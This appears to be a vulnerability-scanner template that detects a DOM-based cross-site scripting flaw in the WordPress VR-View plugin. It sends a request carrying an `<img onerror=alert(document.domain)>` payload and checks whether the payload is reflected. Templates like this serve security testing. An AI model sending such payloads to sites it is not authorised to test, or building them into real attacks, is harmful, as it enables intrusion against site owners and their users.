id: wp-vr-view-xss
brief:
    title: WP VR-View Plugin - Cross-Site Scripting
    by: ritikchaddha
    level: high
    about: While testing the VRView web application, we discovered a DOM Based Cross-Site Scripting Vulnerability in the handling of errors through an inappropriate use of the "innerHTML" property. The use of...
    label:
        - wp
        - wp-plugin
        - wordpress
        - wp-vr-view
        - xss
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/'
      signs:
        - "on": word
          has:
            - /wp-content/plugins/wp-vr-view
          in: body
    - verb: GET
      to:
        - '{{BaseURL}}/wp-content/plugins/wp-vr-view/asset/?image=<img%20src=x%20onerror=alert(document.domain)>'
      signs:
        - "on": word
          has:
            - <img src=x onerror=alert(document.domain)>
          in: body
        - "on": word
          has:
            - text/html
          in: content_type
        - "on": status
          status:
            - 200
